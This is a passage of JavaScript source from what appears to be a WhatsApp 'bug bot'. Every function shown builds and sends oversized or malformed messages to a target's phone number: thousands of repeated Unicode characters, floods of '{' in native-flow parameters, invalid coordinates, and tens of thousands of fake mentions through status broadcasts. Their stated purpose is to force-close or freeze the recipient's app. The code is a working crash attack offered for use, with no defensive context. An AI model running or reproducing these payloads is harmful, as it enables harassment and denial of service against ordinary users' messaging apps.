                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAADAQEBAQAAAAAAAAAAAAAAAgMEAQYFAQEBAQEAAAAAAAAAAAAAAAABAAID/9oADAMBAAIQAxAAAADzz0pLiXNIteDJdW5x50YZ9EmN2e9ayc38jFx8cwKFau5d5urP3XGXNHIxR35TcjMHam/5tnhvSHTux2VaGzRuczhrCMFKBDIFN0DSAOf/xAAlEAACAQQCAgIDAQEAAAAAAAABAgADERIhBDETQRQiQlGRYbH/2gAIAQEAAT8AAvMYOKHQMPYnwWGy4nwTjfISlxVdX3sGfCNgQ0q8VqYBuCIREp39woR+M8jrit9Azz0jlo7nmphdXicimoIUdjc4xJX7Eytx6a0i1/UMXuB7e54gwBvDwwGAL9wcS4YBujPhfprxSaGtESryXraJhEVY6+wJxr+AkLfccvUCaXRjpiUAYAHZi1CCWxBPQPqctgyKQtoi+yNwjRiPTCFSPtAJQJSkw/EmKhyvnGcoSDY76lUs9NAoxEqlXCix1LWlR6ZQBRsdxO4i/wDJTRioWYtlphf1ClwQT95SCUkPlOyJVAIWxFoy2BtG7Mp2yEFTF1W2iJVqMuOMavZg1j1PMQQxJJJ6lSoXJKk7lO5JJ2I707ECMNmI24KhM8thcxGR2s39mND9mMyq1l/s8utQts/7G9wQNC0zI9zytiBeZk9mBoWjNP/EABkRAAIDAQAAAAAAAAAAAAAAAAERABAgIf/aAAgBAgEBPwCd0rAWAKZjMG//xAAfEQEAAgICAgMAAAAAAAAAAAABAAIDERASEyExQUL/2gAIAQMBAT8AgDGs1w1113LPV1G9n5mvVX7ZajMl+xWPA6ay+TbDbqGKv6fc8eOXo1jBSKxssLOuP//Z",
                    scansSidecar: "gEedIqFUVuURFyxuDXiES/ApmRF2SvVhKGpUjvrdz/JxAEcwvuFtiA==",
                    scanLengths: [19972, 38699, 68065, 51270]
                  },
                  hasMediaAttachment: true
                },
                body: {
                  text: "Apoppish Is Back 😘" + "ꦽ".repeat(100000)
                },
                footer: {
                  text: "NeoForce"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000)
                }
              }
            ]
          }
        }
      }
    }
  }, { quoted: VampTagFc });

  await Sat.relayMessage(
    target,
    pesan.message,
    Ptcp
      ? { participant: { jid: target, messageId: pesan.key.id } }
      : {}
  );

  console.log(chalk.blue("Success Sending Fc Bugs"));
}

async function VampCrashBeta(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: 'Apoppish Here !' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: 'Wolf',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQMcsHgJduBlnnAdYUKKvZR6K68unf7-QyUGxiAbmersAyOKWrWQImD-HxZQ4Edsbe4z4Vf69d1cl2NNH94TEeYQxUJKVKAHayLoQONY-w?ccb=9-4&oh=01_Q5Aa1gFIJSOQsH5-cmce_ee4C_CiwYWMbABLd7WBq96f8N-BbA&oe=686B2C5A&_nc_sid=e6ed6c&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "DB/+n19HzggqZQiywcEYAlHH50RbEI0pwXrxD5kkLlA=",
                    fileLength: "178006",
                    height: 1,
                    width: 1,
                    mediaKey: "k6jdnVseHd/eIGBEEkBdtLqwr5L1I7X+jH5WStYQ1tY=",
                    fileEncSha256: "7cEoBgfRxb44DFjw8j+Zjy8GniEqoXWTw1DD98V4eVQ=",
                    directPath: "/o1/v/t24/f2/m234/AQMcsHgJduBlnnAdYUKKvZR6K68unf7-QyUGxiAbmersAyOKWrWQImD-HxZQ4Edsbe4z4Vf69d1cl2NNH94TEeYQxUJKVKAHayLoQONY-w?ccb=9-4&oh=01_Q5Aa1gFIJSOQsH5-cmce_ee4C_CiwYWMbABLd7WBq96f8N-BbA&oe=686B2C5A&_nc_sid=e6ed6c",
                    mediaKeyTimestamp: "1749267080",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAADAQEBAQAAAAAAAAAAAAAAAgMEAQYFAQEBAQEAAAAAAAAAAAAAAAABAAID/9oADAMBAAIQAxAAAADzz0pLiXNIteDJdW5x50YZ9EmN2e9ayc38jFx8cwKFau5d5urP3XGXNHIxR35TcjMHam/5tnhvSHTux2VaGzRuczhrCMFKBDIFN0DSAOf/xAAlEAACAQQCAgIDAQEAAAAAAAABAgADERIhBDETQRQiQlGRYbH/2gAIAQEAAT8AAvMYOKHQMPYnwWGy4nwTjfISlxVdX3sGfCNgQ0q8VqYBuCIREp39woR+M8jrit9Azz0jlo7nmphdXicimoIUdjc4xJX7Eytx6a0i1/UMXuB7e54gwBvDwwGAL9wcS4YBujPhfprxSaGtESryXraJhEVY6+wJxr+AkLfccvUCaXRjpiUAYAHZi1CCWxBPQPqctgyKQtoi+yNwjRiPTCFSPtAJQJSkw/EmKhyvnGcoSDY76lUs9NAoxEqlXCix1LWlR6ZQBRsdxO4i/wDJTRioWYtlphf1ClwQT95SCUkPlOyJVAIWxFoy2BtG7Mp2yEFTF1W2iJVqMuOMavZg1j1PMQQxJJJ6lSoXJKk7lO5JJ2I707ECMNmI24KhM8thcxGR2s39mND9mMyq1l/s8utQts/7G9wQNC0zI9zytiBeZk9mBoWjNP/EABkRAAIDAQAAAAAAAAAAAAAAAAERABAgIf/aAAgBAgEBPwCd0rAWAKZjMG//xAAfEQEAAgICAgMAAAAAAAAAAAABAAIDERASEyExQUL/2gAIAQMBAT8AgDGs1w1113LPV1G9n5mvVX7ZajMl+xWPA6ay+TbDbqGKv6fc8eOXo1jBSKxssLOuP//Z",
                    scansSidecar: "gEedIqFUVuURFyxuDXiES/ApmRF2SvVhKGpUjvrdz/JxAEcwvuFtiA==",
                    scanLengths: [19972, 38699, 68065, 51270]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "Apoppish Here ⚡" + "ꦽ".repeat(10000)
                },
                footer: {
                  text: "https://ApiForce.com"
                },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            mentionJid: ['13135550202@s.whatsapp.net'],
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ Shut Up Bitch }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await Sat.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(chalk.red("Apoppish Success Sending Bug"));
}

async function VampireFCAllDev(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "pfftt",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: "§§",
                address: "\u200D",
              },
            },
            body: {
              text: "Apoppish Is Here Bruda!",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(rep),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };

    await Sat.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
  console.log(chalk.red("Apoppish Success Invisible Fc Sending Bug"));
}

async function VampCrashFCIphone(target) {
  const crashText = "Apoppish Crasher Kembali... ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);

  const message = {
    text: crashText,
    contextInfo: {
      externalAdReply: {
        title: "Wolf.Clouds",
        body: `\u0000`,
        previewType: "PHOTO",
        thumbnail: "",
        sourceUrl: "https://t.me/infocosmox"
      }
    }
  };

  await Sat.sendMessage(target, message, { quoted: null });
}

async function VampireUi(target, Ptcp = false) {
    const stickerPath = './Media/apoppish.tgs';
    const media = await prepareWAMessageMedia(
        { sticker: fs.readFileSync(stickerPath) },
        { upload: Sat.waUploadToServer }
    );

    const contextInfo = {
        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
        groupMentions: [{
            groupJid: "1@newsletter",
            groupSubject: "CoDe"
        }],
        forwardingScore: 9999,
        isForwarded: true,
        externalAdReply: {
            title: "Apoppish 𝗣𝗲𝗰𝗶𝗻𝘁𝗮 𝗡𝗲𝗻𝗲𝗻",
            body: "ꦽ".repeat(90000) + "꧀".repeat(90000) + '@5'.repeat(90000),
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            thumbnail: fs.readFileSync('./Media/thumbnail.jpg'), // opsional
            sourceUrl: 'https://wa.me/1'
        }
    };

    await Sat.relayMessage(target, {
        lottieStickerMessage: media.sticker,
        contextInfo
    }, { messageId: null });
}

async function Blank(target) {
Sat.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(20000) + "@1".repeat(20000),
    contextInfo: {
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "Hati hati kena blank" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(20000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}


async function VampBroadcast(target, mention) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(92000) + "ꦽ".repeat(92000) + "\u0000".repeat(92000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Vampire Here",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "𓆩𓆪" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await Sat.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await Sat.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Vampire Here Bro" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function protocolbug5(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Tama Ryuichi" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "NothingSpecial - Hades.",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠͠͠𝗛̭𝗜̬ᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await Sat.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Sat.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

// function 
async function RyuciDelay(target, mention) {
  const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from(
      { length: 40000 },
      () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    ),
  ];

  const embeddedMusic = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "⛧ KΛϻΛ¡L :: X¡TΣR ⛧" + "ោ៝".repeat(10000),
    title: "⛧ KΛϻΛ¡L :: X¡TΣR ⛧",
    artworkDirectPath:
      "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.youtube.com/@Kamilxiter",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
  };

  const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "289511",
    seconds: 15,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "⛧ KΛϻΛ¡L :: X¡TΣR ⛧",
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
      isSampled: true,
      mentionedJid: mentionedList,
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "⛧ KΛϻΛ¡L :: X¡TΣR ⛧",
    },
    streamingSidecar:
      "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath:
      "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
      {
        embeddedContent: {
          embeddedMusic,
        },
        embeddedAction: true,
      },
    ],
  };

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: { videoMessage },
      },
    },
    {}
  );

  await Sat.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await Sat.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function protocolbug7(target, mention) {
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "C O S M O X"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, messageContent, { userJid: target });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await Sat.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await Sat.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}

bot.launch();
// ========================= [ LAUNCH BOT ] =========================
startSesi();
    // Membersihkan konsol sebelum menampilkan pesan sukses
 